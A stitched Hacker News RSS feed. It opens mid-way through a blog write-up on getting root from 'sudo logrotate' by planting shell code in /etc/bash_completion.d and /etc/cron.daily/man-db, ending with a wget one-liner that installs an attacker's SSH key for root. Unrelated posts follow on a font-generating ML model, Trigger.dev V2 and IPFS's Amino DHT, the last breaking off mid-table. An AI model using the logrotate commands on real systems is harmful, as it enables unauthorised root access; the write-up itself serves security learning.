<p>I moved on to the <code>-s</code> flag that logrotate provides, and while it can create files as root (and overwrite those that exist), it didn’t provide much value:</p>
<div><pre><code><span>$ </span><span>ls</span> <span>-l</span> /tmp/test
<span>-rw-r-----</span> 1 root root 29 Oct  1 01:19 /tmp/test

<span>$ </span><span>cat</span> /tmp/test <span># run as root</span>
logrotate state <span>--</span> version 2
</code></pre></div>

<hr>

<p>Finally, I took a look at the <code>-l</code> flag:</p>
<div><pre><code><span>$ </span><span>sudo </span>logrotate <span>-l</span> ./nonexist <span>test
</span>error: cannot <span>stat test</span>: No such file or directory

<span>$ </span><span>cat </span>nonexist
error: cannot <span>stat test</span>: No such file or directory
Reading state from file: /var/lib/logrotate/status
Allocating <span>hash </span>table <span>for </span>state file, size 64 entries
Creating new state
<span>[</span>..]

Handling 0 logs

<span>$ </span><span>ls</span> <span>-l</span> nonexist
<span>-rw-r--r--</span> 1 root root 952 Oct  1 01:28 nonexist
</code></pre></div>
<p>So we can write arbitrary data (<strong>test</strong> here is the arbitrary data, albeit with some garbage between it) to an arbitrary file which is owned by root. What more can we do with this?</p>
<div><pre><code>user@server:/etc/bash_completion.d<span>$ </span><span>ls</span> <span>-l</span>
total 4
<span>-rw-r--r--</span> 1 root root 439 Feb 28  2023 git-prompt

user@server:/etc/bash_completion.d<span>$ </span><span>sudo </span>logrotate <span>-l</span> /etc/bash_completion.d/backdoor <span>'2&gt;/dev/null;uname -a; return 0;'</span>
error: cannot <span>stat </span>2&gt;/dev/null<span>;</span><span>uname</span> <span>-a</span><span>;</span> <span>return </span>0<span>;</span>: No such file or directory

user@server:/etc/bash_completion.d<span>$ </span><span>ls</span> <span>-l</span>
total 8
<span>-rw-r--r--</span> 1 root root 652 Sep 30 14:35 backdoor
<span>-rw-r--r--</span> 1 root root 439 Feb 28  2023 git-prompt

user@server:/etc/bash_completion.d<span>$ </span><span>cat </span>backdoor
error: cannot <span>stat </span>2&gt;/dev/null<span>;</span><span>uname</span> <span>-a</span><span>;</span> <span>return </span>0<span>;</span>: No such file or directory
acquired lock on state file /var/lib/logrotate/statusReading state from file: /var/lib/logrotate/status
Allocating <span>hash </span>table <span>for </span>state file, size 64 entries
Creating new state
<span>[</span>..]

user@server:/etc/bash_completion.d<span>$ </span><span>exit
logout
</span>Shared connection to server closed.

<span>$ </span>ssh user@server
Last login: Sat Sep 30 14:33:20 2023 from 10.0.0.0
Linux server 5.15.0-83-generic <span>#92-Ubuntu SMP Mon Aug 14 09:30:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>
Linux server 5.15.0-83-generic <span>#92-Ubuntu SMP Mon Aug 14 09:30:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div>

<p>Basically, we can create an arbitrary file in <code>/etc/bash_completion.d/</code> which, if bash completion is enabled, will be sourced when a user logs into the server. The arbitrary data is <code>2&gt;/dev/null;uname -a; return 0;</code> which effectively sends the first garbage data to <em>/dev/null</em>; executes <code>uname -a</code>; then returns, ignoring the rest of the junk data. This could be used to get a shell when a real user logs into the server, hopefully obtaining more access. Alternatively, we could create some file in <em>/etc/init.d/</em>, <em>/etc/profile.d/</em>, or overwrite <em>/etc/profile</em>. The possibilities are endless.</p>

<hr>

<p>I wasn’t happy with leaving it like this, so I took a further look. As it turns out, the permissions of the log files are retained too:</p>
<div><pre><code><span>$ </span><span>touch </span>check-perms
<span>$ </span><span>chmod </span>777 check-perms
<span>$ </span><span>sudo </span>logrotate <span>-l</span> ./check-perms <span>test
</span>error: cannot <span>stat test</span>: No such file or directory

<span>$ </span><span>ls</span> <span>-l</span> check-perms
<span>-rwxrwxrwx</span> 1 user user 952 Oct  1 01:32 check-perms
</code></pre></div>
<p>What can we do with this?</p>

<p>Well, we can edit one of the scripts in <em>/etc/cron.daily/</em>:</p>
<div><pre><code>user@server:/etc/cron.daily<span>$ </span><span>ls</span> <span>-l</span> man-db
<span>-rwxr-xr-x</span> 1 root root 1395 Mar 12  2023 man-db

user@server:/etc/cron.daily<span>$ </span><span>sudo </span>logrotate <span>-l</span> /etc/cron.daily/man-db <span>'2&gt;/dev/null;uname -a; exit 0;'</span>
error: cannot <span>stat </span>2&gt;/dev/null<span>;</span><span>uname</span> <span>-a</span><span>;</span> <span>exit </span>0<span>;</span>: No such file or directory

user@server:/etc/cron.daily<span>$ </span><span>ls</span> <span>-l</span> man-db
<span>-rwxr-xr-x</span> 1 root root 652 Sep 30 14:50 man-db

user@server:/etc/cron.daily<span>$ </span>./man-db
Linux server 5.15.0-83-generic <span>#92-Ubuntu SMP Mon Aug 14 09:30:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div>
<p>The next time the cronjob runs, our arbitrary code is executed: as root.</p>

<hr>

<p>So, to answer the question: with only the <code>sudo logrotate</code> command available, can we obtain root? Yep; it’s as simple as:</p>
<div><pre><code><span>sudo </span>logrotate <span>-l</span> /etc/cron.daily/man-db <span>'2&gt;/dev/null;wget host/ssh.key -O /root/.ssh/authorized_keys2; exit 0;'</span>
</code></pre></div>
<p>then wait until the cronjob is run, and just ssh in. That’s my solution to this problem, anyways.</p>

<hr>

<p>And of course, the slightly more appropriate way to achieve the goal of allowing a normal user to rotate logs would be to allow sudo to run a wrapper script like this:</p>
<div><pre><code><span>#!/bin/sh</span>
<span>case</span> <span>"</span><span>$1</span><span>"</span> <span>in</span>
    <span>[</span>a-z0-9A-Z<span>\-</span><span>]</span><span>)</span>
       /usr/sbin/logrotate <span>-f</span> /etc/logrotate.d/<span>"</span><span>$1</span><span>"</span>
        <span>;;</span>
    <span>*</span><span>)</span>
        <span>exit </span>1
        <span>;;</span>
<span>esac</span>
</code></pre></div>

</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Hey, Computer, Make Me a Font (274 pts)]]></title>
            <link>https://serce.me/posts/02-10-2023-hey-computer-make-me-a-font</link>
            <guid>37750859</guid>
            <pubDate>Tue, 03 Oct 2023 12:17:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://serce.me/posts/02-10-2023-hey-computer-make-me-a-font">https://serce.me/posts/02-10-2023-hey-computer-make-me-a-font</a>, See on <a href="https://news.ycombinator.com/item?id=37750859">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>This is a story of my journey learning to build generative ML models from scratch and teaching a computer to create fonts in the process. Yes, genuine <em>true type fonts</em>, with a capital-only set of glyphs. The model takes a font description as an input, and produces a font file as an output. I named the project 'FontoGen'.</p>
<p>Here are a few examples of fonts generated by the FontoGen model:</p>
<p><span><p>bold, sans</p></span>
<span><p>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG?</p></span>
<span><p>italic, serif</p></span>
<span><p>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG!</p></span>
<span><p>techno, sci-fi, extrabold</p></span>
<span><p>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG.</p></span></p><p>If you want to generate your very own font, head to the <a href="https://github.com/SerCeMan/fontogen">GitHub project</a>, clone it, and don’t forget to leave a star. Then download the weights from <a href="https://huggingface.co/SerCe/fontogen">Huggingface</a>, and follow the instructions here. And if you want to learn the full story, keep reading.</p>
<p><img src="https://serce.me/images/make-me-a-font/bender.jpeg" alt=""></p>
<div><blockquote><p>I'm gonna go build my own theme park</p></blockquote><div><p>— </p><!-- --><p>Bender Bending Rodríguez</p></div></div>
<h2 id="intro"><a href="#intro"><span></span></a>Intro</h2>
<p>At the beginning of 2023, when AI started creating ripples across the internet, like many others I became very interested in the topic. I was sucked into the world of making memes with Stable Diffusion, training LoRAs on my friends’ faces, and fine-tuning text-to-speech models to mimic famous voices.</p>
<p>At some point, I started looking at text-to-SVG generation which, as it turned out, is a much harder task compared to raster-based text-to-image generation. Not only is the format itself quite complex, it also allows for representing the exact same shape in many different ways. As I was interested in learning how to build a generative ML model from scratch, this became my weekend project.</p>
<h2 id="the-idea"><a href="#the-idea"><span></span></a>The Idea</h2>
<p>As I began exploring different ways to generate SVGs, I came across the IconShop<a href="#references"><sup>2</sup></a> paper which achieved pretty impressive results. It took me some time to reproduce them by building a model based on the description in the paper. After finally achieving close-enough results, I realised that the process of generating fonts could be similar to the process of generating SVGs, and started working on the project.</p>
<figure><img src="https://serce.me/images/make-me-a-font/fontogen.png"><figcaption>The final result</figcaption></figure>
<p>Compared to SVG images, fonts are both easier and harder to generate. The easier part is that fonts don’t have the colour component present in colourful SVG images. However, the harder part is that a single font consists of many glyphs, and all glyphs in a font must maintain stylistic consistency. Maintaining consistency turned out to be a significant challenge which I'll describe in more detail below.</p>
<h2 id="the-model-architecture"><a href="#the-model-architecture"><span></span></a>The Model Architecture</h2>
<p>Inspired by the SVG generation approach described in the IconShop paper, the model is a sequence-to-sequence model trained on sequences that consist of text embeddings followed by font embeddings.</p>
<figure><img src="https://serce.me/images/make-me-a-font/embeddings.png"><figcaption>Input Sequence</figcaption></figure>
<h3 id="text-embeddings"><a href="#text-embeddings"><span></span></a>Text Embeddings</h3>
<p>To produce text embeddings, I used a pre-trained BERT encoder model, which helps to capture the "meaning" of the prompt. The text sequence is limited to 16 tokens, which in BERT’s case roughly corresponds to the same number of words. While the text prompt could potentially be longer, memory constraints were a significant concern for my single-GPU setup. So, all textual font descriptions present in the dataset were summarised to a set of a few keywords with the help of OpenAI’s GPT-3.</p>
<h3 id="font-embeddings"><a href="#font-embeddings"><span></span></a>Font Embeddings</h3>
<p>In order to produce font embeddings, the fonts first need to be converted to a sequence of tokens similar to how text is tokenised with the BERT tokeniser. In this project, I’ve only considered the glyph shapes and ignored the width, height, offset, and other useful metadata present in the font files. Each glyph was downsampled to 150x150 and normalised. I found that the 150x150 dimension preserves font features with minimal glyph deformation, which was more pronounced at lower resolutions.</p>
<p><img src="https://serce.me/images/make-me-a-font/glyphs.png" alt=""></p>
<p>I used Python’s <a href="https://github.com/fonttools/fonttools">fonttools</a> to parse font files which can conveniently process each glyph as a <a href="https://fonttools.readthedocs.io/en/latest/pens/recordingPen.html#fontTools.pens.recordingPen.DecomposingRecordingPen">sequence</a> of curves, lines, and move commands, where each command can be followed by zero or more points. I decided to limit the glyph set to the following glyphs to get a minimal usable font.</p>
<pre><code>ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.,!?
</code></pre>
<p>The final model vocabulary needed to represent 22547 different tokens:</p>
<ul>
<li>40 glyphs,</li>
<li>5 line path operations: <em>moveTo</em>, <em>lineTo</em>, <em>qCurveTo</em>, <em>curveTo</em>, <em>closePath</em>,</li>
<li>2 tokens to represent EOS (end of sequence) and PAD (padding),</li>
<li>150^2 = 22500 different points.</li>
</ul>
<figure><img src="https://serce.me/images/make-me-a-font/font-encoding.png"><figcaption>An example font token sequence.</figcaption></figure>
<p>The token sequence is then converted into an embedding vector using learnable embedding matrices. Additionally, as proposed in the SkexGen<a href="#references"><sup>1</sup></a> paper, separate matrices were used specifically for <em>x</em> and <em>y</em> coordinates. And the final step was to apply positional embeddings.</p>
<h3 id="transformer"><a href="#transformer"><span></span></a>Transformer</h3>
<p>The model is an autoregressive encoder-only transformer consisting of 16 layers and 8 blocks. The model’s dimension is 512, resulting in a total of 73.7 million parameters.</p>
<pre><code>  | Name  | Type     | Params
-----------------------------------
0 | model | Fontogen | 73.7 M
-----------------------------------
73.7 M    Trainable params
0         Non-trainable params
73.7 M    Total params
294.728   Total estimated model params size (MB)
</code></pre>
<p>I computed the loss using simple cross-entropy and disregarded the padding token.</p>
<h3 id="attention"><a href="#attention"><span></span></a>Attention</h3>
<p>Every time a part of the glyph is generated, several factors influence the decision on which token comes next. First, the model prompt affects the glyph’s shape. Next, the model needs to consider all previously generated tokens for that glyph. Finally, it needs to take into account all other glyphs generated so far to ensure consistency in style.</p>
<p>When doing initial experiments with only a handful of glyphs, I started with full attention. However, as the sequence length increased, this approach became impractical, prompting a shift to sparse attention. After exploring various options, I settled on BigBird<a href="#references"><sup>3</sup></a> attention. This approach supports both global attention, to focus on the initial prompt, and window attention, which observes N previous tokens, capturing the style of several preceding glyphs.</p>
<figure><img src="https://serce.me/images/make-me-a-font/bigbird.png"><figcaption>BigBird attention</figcaption></figure>
<p>Given that a single glyph can have a variable number of tokens, I set the attention mechanism to consider at least the 3 preceding glyphs. While most of the time, the approach has been successful at preserving the overall font style, in some complex cases, the style would slowly drift into unrecoverable mess.</p>
<figure><img src="https://serce.me/images/make-me-a-font/calfailure.png"><figcaption>Calligraphy is hard</figcaption></figure>
<h2 id="training"><a href="#training"><span></span></a>Training</h2>
<p>To train the model, I assembled a dataset of 71k distinct fonts. 60% of all fonts only had a vague category assigned to them, while 20% fonts were accompanied by longer descriptions, so the descriptions were condensed to a few keywords using GPT-3.5. Additionally, I included 15% fonts where the prompt only contained the font's name, and the remaining 5% of the dataset had an empty textual description assigned to them to ensure that the model is capable of generating fonts with no prompt at all.</p>
<p>Due to large memory requirements, my Nvidia 4090 with 24G of VRAM could only fit two font sequences in a single batch, and I’d often observe gradient explosions. Using gradient accumulation and gradient clipping helped to resolve the issue. The model was trained for 50 epochs which took 127 hours. I restarted training once after 36 epochs, and kept training for another 14 epochs with reduced gradient accumulation. The training was stopped when the validation loss showed very little improvements.</p>

<h2 id="chasing-performance"><a href="#chasing-performance"><span></span></a>Chasing Performance</h2>
<p>Achieving good training performance was critical since I was training on a single GPU, and training took a significant amount of time.</p>
<ul>
<li>In the initial iteration, I processed font files and textual descriptions directly within the model on each step. While this codebase structure streamlined prototyping, it meant that the same tasks had to be repeated over and over again, making the training process slower. Additionally, having BERT loaded in memory meant that it would take up precious VRAM. By shifting as much as possible to the dataset preprocessing stage, I achieved a threefold performance boost.</li>
<li>Originally, the model relied on huggingface's transformers. Migrating the code to xformers<a href="#references"><sup>4</sup></a> gave a very visible boost in speed and memory usage.</li>
</ul>
<h2 id="instead-of-conclusion"><a href="#instead-of-conclusion"><span></span></a>Instead Of Conclusion</h2>
<p>I achieved what I set out to do – I learned how to build a generative transformer model, and built a project that's capable of generating fonts as a side effect. But there are so many things that I still haven't tried. For example, what if the model could be integrated into the existing font editors so that the font designer only creates a single glyph A, and all other glyphs are generated by the model. Or maybe the font editor could suggest the control points for bézier curves as they're being drawn! The horizon is vast, and there's much left to explore.</p>
<p>If you've read this article, and you think that I've overlooked something obvious, there's a good chance I did! I'm always keen to learn more, so please reach out and let me know what you think.</p>
<h2 id="thank-you-to"><a href="#thank-you-to"><span></span></a>Thank you to</h2>
<ul>
<li><a href="https://twitter.com/ptuls">Paul Tune</a> for answering many questions I had about building transformer models.</li>
</ul>
<h2 id="references"><a href="#references"><span></span></a>References</h2>
<ol>
<li><a href="https://arxiv.org/abs/2207.04632">SkexGen: Autoregressive Generation of CAD Construction Sequences with Disentangled Codebooks</a></li>
<li><a href="https://arxiv.org/abs/2304.14400">IconShop: Text-Guided Vector Icon Synthesis with Autoregressive
Transformers</a></li>
<li><a href="https://arxiv.org/abs/2007.14062">Big Bird: Transformers for Longer Sequences</a></li>
<li><a href="https://github.com/facebookresearch/xformers">xFormers: A modular and hackable Transformer modelling library</a></li>
</ol>
<h2 id="discuss-on"><a href="#discuss-on"><span></span></a>Discuss on</h2>
<ul>
<li><a href="https://twitter.com/SerCeMan/status/1708799954700181912">Twitter</a></li>
</ul><div><h2>Subscribe</h2><div><p>I'll be sending an email every time I publish a new post.</p><p>Or, subscribe with <a href="https://serce.me/feed.xml">RSS</a>.</p></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Show HN: Trigger.dev V2 – a Temporal alternative for TypeScript devs (154 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=37750763</link>
            <guid>37750763</guid>
            <pubDate>Tue, 03 Oct 2023 12:07:19 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=37750763">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><table id="hnmain">
        <tbody><tr><td></td></tr>
<tr id="pagespace" title="Show HN: Trigger.dev V2 – a Temporal alternative for TypeScript devs"></tr><tr><td><table>
        <tbody><tr id="37750763">
      <td><span></span></td>      <td><center><a id="up_37750763" href="https://news.ycombinator.com/vote?id=37750763&amp;how=up&amp;goto=item%3Fid%3D37750763"></a></center></td><td><span><a href="https://news.ycombinator.com/item?id=37750763">Show HN: Trigger.dev V2 – a Temporal alternative for TypeScript devs</a></span></td></tr><tr><td colspan="2"></td><td><span>
          <span id="score_37750763">116 points</span> by <a href="https://news.ycombinator.com/user?id=eallam">eallam</a> <span title="2023-10-03T12:07:19"><a href="https://news.ycombinator.com/item?id=37750763">7 hours ago</a></span> <span id="unv_37750763"></span> | <a href="https://news.ycombinator.com/hide?id=37750763&amp;goto=item%3Fid%3D37750763">hide</a> | <a href="https://hn.algolia.com/?query=Show%20HN%3A%20Trigger.dev%20V2%20%E2%80%93%20a%20Temporal%20alternative%20for%20TypeScript%20devs&amp;type=story&amp;dateRange=all&amp;sort=byDate&amp;storyText=false&amp;prefix&amp;page=0">past</a> | <a href="https://news.ycombinator.com/fave?id=37750763&amp;auth=7cc07f52ae455b4a810183cea187b1db60bc3aca">favorite</a> | <a href="https://news.ycombinator.com/item?id=37750763">25&nbsp;comments</a>        </span>
              </td></tr>
    <tr></tr><tr><td colspan="2"></td><td><div><p>Back in February, we posted a Show HN about building a “developer-first open source Zapier alternative” (https://news.ycombinator.com/item?id=34610686). This was v1 of Trigger.dev.</p><p>During the months since, we’ve gathered a lot of feedback from early users and realized that what developers actually wanted was more like an easier-to-use Temporal with integrations.</p><p>Here’s what we’ve learned so far:</p><p>- Serverless timeouts make it hard for anyone to write reliable background jobs. So our current product makes that easy for Next.js and other full-stack React frameworks. Long-running server support is coming soon.</p><p>- We simplified the architecture to make it far easier to self-host. This was the most common comment in our previous Show HN.</p><p>- We made it much easier to contribute to. You can now add new API integrations for any service we don’t already support. Either publicly (we appreciate PRs) or privately in your existing codebase.</p><p>We’re open about what we’re building (https://trigger.dev/changelog) and what we’re planning on doing next (https://trigger.dev#roadmap) as we believe community feedback ensures that we’re solving real problems.</p><p>So here’s where we’re at, and where we’re headed:</p><pre><code>  [x] Easy self-hosting.
  
  [x] Serverless. Long-running Jobs on your serverless backend.
  
  [x] Integration kit. Build your own integrations, or use ours.
  
  [x] Bring-Your-Own-Auth. You can now authenticate integrations as your users.
  
  [x] Dashboard. View every Task in every Run.
  
  [x] Cloud service. No deployment required.
  
  [x] React hooks. Easily update your UI with Job progress.
  
  [x] React frameworks. Support for Next.js, Astro, Remix, Express.
  
  [ ] More frameworks. Support for SvelteKit, Nuxt.js, Fastify, Redwood.
  
  [ ] Background functions. Offload long or intense tasks to our infrastructure.
  
  [ ] Long-running servers. Use Trigger.dev from your long-running backend.
  
  [ ] Polling Triggers. Subscribe to changes without webhooks.
  
  [ ] And lots more…
</code></pre><p>
I’d love to hear your thoughts on background jobs. Have we missed anything off the list? What should we be building next?</p><p>https://github.com/triggerdotdev/trigger.dev</p></div></td></tr>        <tr></tr><tr><td colspan="2"></td><td><form action="comment" method="post"></form></td></tr>  </tbody></table>
  </td></tr>
<tr><td><img src="https://news.ycombinator.com/s.gif" height="10" width="0"><br>
<center><a href="https://www.ycombinator.com/apply/">Applications are open for YC Winter 2024</a></center><br>
<center><span><a href="https://news.ycombinator.com/newsguidelines.html">Guidelines</a> | <a href="https://news.ycombinator.com/newsfaq.html">FAQ</a> | <a href="https://news.ycombinator.com/lists">Lists</a> | <a href="https://github.com/HackerNews/API">API</a> | <a href="https://news.ycombinator.com/security.html">Security</a> | <a href="https://www.ycombinator.com/legal/">Legal</a> | <a href="https://www.ycombinator.com/apply/">Apply to YC</a> | <a href="mailto:hn@ycombinator.com">Contact</a></span></center></td></tr>      </tbody></table></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Amino – The Public IPFS DHT Is Getting a Facelift (128 pts)]]></title>
            <link>https://blog.ipfs.tech/2023-09-amino-refactoring/</link>
            <guid>37749776</guid>
            <pubDate>Tue, 03 Oct 2023 09:52:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.ipfs.tech/2023-09-amino-refactoring/">https://blog.ipfs.tech/2023-09-amino-refactoring/</a>, See on <a href="https://news.ycombinator.com/item?id=37749776">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody"><p>Two major items are being announced in this blogpost, both of which are equally exciting and relate to “the Public IPFS DHT” (the <a href="https://docs.ipfs.tech/concepts/dht/#dual-dht" target="_blank" rel="noopener noreferrer">public Kademlia-based DHT<span> <span>(opens new window)</span></span></a> that <a href="https://docs.ipfs.tech/how-to/modify-bootstrap-list/" target="_blank" rel="noopener noreferrer">Kubo (and other implementations) default to bootstrapping&nbsp;into<span> <span>(opens new window)</span></span></a> with the libp2p protocol <code>/ipfs/kad/1.0.0</code>), which is henceforth going to be called <strong>“Amino”</strong>. The first relates to a major refactoring of the Amino codebase and the second is an optimization of the publish operation of the protocol, so that providing content to Amino is made much faster and resource-efficient.</p> <h2 id="why-amino"><a href="#why-amino">#</a> Why Amino?</h2> <p>The “Public IPFS DHT” is henceforth going to be called <strong>“Amino”</strong>. This follows along with the trend from 2022 in the IPFS ecosystem to use more precise language to create space for alternative options (i.e., other DHTs). Just as there isn’t one IPFS implementation, there isn’t one content routing system or DHT. “Amino” was chosen from Amino acids - the building block for larger, stronger structures, which is what we believe will happen with this network. There can be several IPFS DHT networks, and they can choose to borrow functionality from the “Amino” network. More context on the naming can be found <a href="https://github.com/ipfs/ipfs/discussions/473" target="_blank" rel="noopener noreferrer">here<span> <span>(opens new window)</span></span></a>.</p> <h2 id="refactoring-of-go-libp2p-kad-dht-codebase"><a href="#refactoring-of-go-libp2p-kad-dht-codebase">#</a> Refactoring of <code>go-libp2p-kad-dht</code> codebase</h2> <p>It has long been realized that the current go implementation of libp2p’s Distributed Hash Table (DHT), which is used by IPFS implementations like Kubo and other projects/platforms, is in need of a major revision. The problems that have been identified by core maintainers and community contributors alike can be summarised in the following:</p> <ol><li>Several years of adding extra features to the codebase and iterations of core functionality have made the DHT faster and more efficient, but have also added substantially to its complexity. It has now become more <strong>difficult to understand and make changes to the code</strong>, which indirectly is pushing developers away from contributing to it.</li> <li><strong>Flaky tests due to concurrency issues</strong>. Unit tests, which evaluate if the implementation is working as expected, are difficult to implement due to extensive parallelization of several parts of the code.</li> <li>Lack of unit tests in turn make it <strong>hard to carry out performance evaluation tests</strong>. This has recently resulted in performance evaluation results that are hard to understand or act upon - Bitswap’s <code>Provider Search</code> delay is a good example here [<a href="https://github.com/ipfs/kubo/pull/9530" target="_blank" rel="noopener noreferrer">link<span> <span>(opens new window)</span></span></a>].</li> <li>The current implementation is carrying a <strong>non-negligible amount of technical debt</strong> that was acquired over the years. For instance, Kademlia should only handle Kademlia identifiers (256-bits bitstrings) internally, but it is currently using strings [<a href="https://github.com/libp2p/go-libp2p-kad-dht/blob/b63ad6096833d36b365f1361edab871f6cdc283c/query.go#L83" target="_blank" rel="noopener noreferrer">source<span> <span>(opens new window)</span></span></a>].</li></ol> <p>The <a href="https://www.notion.so/IPFS-f3c309cecfd844e788d8b9e13472a97b?pvs=21" target="_blank" rel="noopener noreferrer">PL EngRes IPFS Stewards team<span> <span>(opens new window)</span></span></a> has been working on a <strong>major refactoring of <code>go-libp2p-kad-dht</code></strong>. In this context, a new library, <code>go-libdht</code>&nbsp;defines the basic building blocks for implementing DHTs, and will be used by the refactored&nbsp;<code>go-libp2p-kad-dht</code>. The goal of the refactoring project is to address the above challenges. In particular,</p> <ul><li>make the code base easy to modify and improve by making it single-threaded.</li> <li>allow for sequential, deterministic code execution, making debugging easier, testing more reliable and simulation/reproducibility possible and,</li> <li>get rid of unnecessary code and complexity.</li></ul> <h3 id="expected-changes-timeline"><a href="#expected-changes-timeline">#</a> Expected Changes &amp; Timeline</h3> <p>The refactored codebase is being worked on in the <a href="https://github.com/libp2p/go-libp2p-kad-dht/tree/v2-develop" target="_blank" rel="noopener noreferrer">v2-develop branch of go-libp2p-kad-dht<span> <span>(opens new window)</span></span></a>. The current progress, next tasks and open issues can be found at this project board: <a href="https://github.com/orgs/plprobelab/projects/1" target="_blank" rel="noopener noreferrer">https://github.com/orgs/plprobelab/projects/1<span> <span>(opens new window)</span></span></a>. The refactored code is expected to be completed, tested and ready for integration into Kubo for further testing during the first half of October.</p> <p>Where possible, we aim to remain compatible with version 1. There are no breaking protocol changes planned, and we expect to be able to adhere to the standard Routing interface used by Kubo. The libp2p Kademlia implementation has been battle tested through many years of use, and we want to take advantage of the learnings from that real-world usage while improving the ergonomics and clarity of the code. However, we will be taking this opportunity to look closely at the current code interfaces and to propose improved or new ones.</p> <p>Most of the changes being made are internal to the operation of the DHT. We’re creating a new state machine oriented execution model that is very different to the existing implementation. This allows us to bound work and resources more cleanly and prioritize work performed more appropriately. Performance will also be different and, for the initial release, our goal is for this to be similar to the current codebase. However, we expect the new execution model will give us more scope for optimization in the future. Having better control over the scheduling of work will also allow the new implementation to continue to perform well under resource pressure and high load.</p> <h2 id="making-reprovides-to-amino-lightning-fast"><a href="#making-reprovides-to-amino-lightning-fast">#</a> Making Reprovides to Amino lightning fast</h2> <p>Content providers with a large number of CIDs to provide to the DHT have traditionally been facing difficulties. The current PUT operation in <code>go-libp2p-kad-dht</code> lacks resource efficiency. For every CID being reprovided, the provider performs a lookup and initiates a connection with the top 20 nearest peers <em>sequentially</em>. In practice, this means that if a peer needs to be contacted twice for two CIDs, the providing peer needs to open two connections to the same peer at different points in time within the same reprovide task.</p> <p>In turn, this results in significant bandwidth requirements and deters large content providers from advertising their content on Amino (the IPFS DHT) due to cost constraints. The sequential manner in which reprovides take place can result in content providers failing to refresh all content within the 48h provider record expiration interval [<a href="https://github.com/libp2p/go-libp2p-kad-dht/blob/b63ad6096833d36b365f1361edab871f6cdc283c/providers/providers_manager.go#L38" target="_blank" rel="noopener noreferrer">link to source<span> <span>(opens new window)</span></span></a>][<a href="https://github.com/libp2p/specs/tree/master/kad-dht#content-provider-advertisement-and-discovery" target="_blank" rel="noopener noreferrer">link to spec<span> <span>(opens new window)</span></span></a>], rendering the content inaccessible.</p> <p>Our approach is to optimize the provide process, making it much less resource intensive. This will pave the way for a significantly larger throughput in the number of "provides".</p> <h3 id="high-level-design-of-reprovidesweep"><a href="#high-level-design-of-reprovidesweep">#</a> High level design of <code>ReprovideSweep</code></h3> <p>The base premise of <code>ReprovideSweep</code> is that <em><em>all keys located in the <em>same keyspace region</em> are reprovided <em>all at once,</em></em> instead of sequentially,</em> which is currently the case. This is in contrast to the status quo of re-providing in the current IPFS DHT, where the provider record of each CID is sent out separately, though a new connection.</p> <p>Given that some large Content Providers are publishing way more CIDs than there are DHT Servers, by the <a href="https://en.wikipedia.org/wiki/Pigeonhole_principle" target="_blank" rel="noopener noreferrer">pigeonhole principle<span> <span>(opens new window)</span></span></a> there must be DHT Servers that are allocated more than one Provider Record, by a particular Content Provider. The primary rationale is to send/re-provide all Provider Records allocated to the same DHT Server <em><strong><strong><strong>at once, instead of having to revisit the same server later on, re-establish a connection, and store the provider record</strong></strong></strong></em>.</p> <p>However, because sending multiple Provider Records requires a new RPC causing a breaking change, it isn’t trivial to send all Provider Records exactly <em>at once.</em> That said, the most expensive part in a (Re)Provide operation is the DHT walk to discover the right DHT Servers to store the Provider Records on, as well as opening new connections to these peers. Once these peers are known, and a connection is already open, the Content Provider can simply reuse the same connection to send multiple individual <code>Provide</code> requests, thereby avoiding breaking changes while still reaping performance gains.</p> <p>The <code>go-libp2p-kad-dht</code> DHT implementation must keep track of the CIDs that must be republished every <code>Interval</code> (let’s assume that all Provider Records are republished at the same frequency). The Kademlia identifiers of the CIDs to republish must be arranged in a <a href="https://github.com/guillaumemichel/py-binary-trie" target="_blank" rel="noopener noreferrer">binary trie<span> <span>(opens new window)</span></span></a> to allow for faster access. As each Provider Record is replicated on 20 different DHT Servers, 20 DHT Servers in a close locality are expected to store the same Provider Records (this is not 100% accurate, but suffices for our high-level description here - we’ll publish all the details in a subsequent post, when the solution is in production).</p> <p>In a nutshell, the Content Provider will continuously lookup keys across the entire keyspace, hence “sweeping” the keyspace. For each key that is to be published, the Content Provider will find the 20 closest peers, and lookup in its “CIDs Republish Binary Trie” all Provider Records that would belong to those specific 20 remote peers. Doing this match-making exercise, content providers will be able to reprovide all provider records that correspond to a particular peer at once. Based on this logic, Content Providers are only limited by network throughput.</p> <p>You can watch a recording from <a href="https://2023.ipfs-thing.io/" target="_blank" rel="noopener noreferrer">IPFS Thing 2023<span> <span>(opens new window)</span></span></a> explaining the concept in more detail <a href="https://youtu.be/bXaL64fp55c?si=1LuukjErCG_bz02N" target="_blank" rel="noopener noreferrer">here<span> <span>(opens new window)</span></span></a>.</p> <h3 id="reprovidesweep-performance"><a href="#reprovidesweep-performance">#</a> <code>ReprovideSweep</code> Performance</h3> <p><code>ReprovideSweep</code> is not implemented yet, hence, we can only approximate its performance analytically. In the tables below we see that <code>ReprovideSweep</code> is improving performance significantly on all fronts and important metrics, assuming that the number of CIDs (<code>#CIDs</code>) that a provider wishes to publish is much larger than the number of DHT Server nodes in the network (<code>#DHT_SERVERs</code>), i.e. <code>#CIDs &gt;&gt; #DHT_SERVERs</code>:</p> <ul><li>The number of DHT Lookups is reduced from being equal to the number of CIDs to be published, down to 1/20th of the number of DHT Server nodes in the network.</li> <li>The number of connections that need to be opened is also reduced and is equal to the number of DHT Server nodes (if the number of CIDs to be provided is much larger than the number of server nodes in the network).</li> <li>As we see in the second table, assuming a network size of ~25k DHT Server nodes, the overall improvement in terms of ‘number of connections open’ and ‘number of DHT Lookups’ is significant reaching an improvement of ~800x for 1M CIDs.</li></ul> <table><thead><tr><th></th> <th>Current Reprovide</th> <th>Reprovide Sweep</th></tr></thead> <tbody><tr><td>Number of 